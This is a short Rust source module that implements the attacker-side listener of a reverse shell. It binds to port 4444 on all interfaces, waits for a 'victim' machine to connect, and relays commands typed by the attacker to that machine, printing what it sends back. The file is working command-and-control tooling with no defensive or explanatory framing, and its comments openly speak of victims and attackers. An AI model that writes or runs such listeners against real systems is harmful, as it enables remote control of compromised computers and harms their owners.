// reverseShellCon.rs (module)
use std::io::{self, BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};

pub fn start_reverse_shell_server() -> Result<(), io::Error> {
    let listener = TcpListener::bind("0.0.0.0:4444")?; // Listen on all interfaces
    println!("Reverse shell server started. Waiting for victim...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("Victim connected: {}", stream.peer_addr()?);
                handle_victim(stream)?; // Handle the victim's session
            }
            Err(e) => eprintln!("Failed to accept connection: {}", e),
        }
    }

    Ok(())
}

fn handle_victim(mut stream: TcpStream) -> Result<(), io::Error> {
    let mut reader = BufReader::new(stream.try_clone()?);

    loop {
        // Prompt the user to enter a command to send to the victim
        print!("Enter command to send to victim (or 'exit' to disconnect): ");
        io::stdout().flush()?; // Ensure prompt is displayed
        let mut command = String::new();
        io::stdin().read_line(&mut command)?; // Read input from the attacker

        let command = command.trim();
        if command.eq_ignore_ascii_case("exit") {
            println!("Disconnecting from victim...");
            break; // End the session if 'exit' is typed
        }

        // Send the command to the victim
        stream.write_all(command.as_bytes())?;
        stream.write_all(b"\n")?;

        // Read the victim's response and print it
        let mut response = String::new();
        reader.read_line(&mut response)?;
        if response.is_empty() {
            println!("Victim disconnected.");
            break; // Exit the loop if no response (victim disconnected)
        }

        println!("Response:\n{}", response); // Display the response from the victim
    }

    Ok(())
}
